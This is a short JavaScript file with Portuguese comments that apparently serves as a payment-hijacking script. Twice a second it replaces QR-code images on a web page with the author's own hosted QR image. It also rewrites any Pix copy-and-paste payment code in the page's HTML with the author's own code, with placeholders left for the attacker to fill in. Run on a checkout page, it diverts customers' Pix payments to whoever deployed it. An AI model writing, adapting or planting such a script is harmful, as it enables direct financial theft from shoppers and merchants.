// Arquivo: troca_pix.js
setInterval(function() {
    // 1. TROCA DA IMAGEM DO QR CODE
    // Procura qualquer imagem que tenha "qr-code" no link
    var img = document.querySelector('img[src*="qr-code"]');
    if (img) {
        // Substitua pela URL da imagem do SEU QR Code hospedada na web
        img.src = "https://github.com/luancabral1228-create/aaa/blob/main/meu_qrcode.png";
    }

    // 2. TROCA DO CÓDIGO COPIA E COLA
    // Procura por qualquer texto que siga o padrão de um código Pix (começa com 000201)
    var bodyText = document.body.innerHTML;
    var pixPattern = /000201[a-zA-Z0-9]+/g;
    
    if (pixPattern.test(bodyText)) {
        // Substitua pelo seu código Pix Copia e Cola completo
        var meuPix = "000201010212268...SEU_CODIGO_AQUI...";
        document.body.innerHTML = bodyText.replace(pixPattern, meuPix);
    }
}, 500); // O script verifica a página a cada meio segundo para garantir a troca
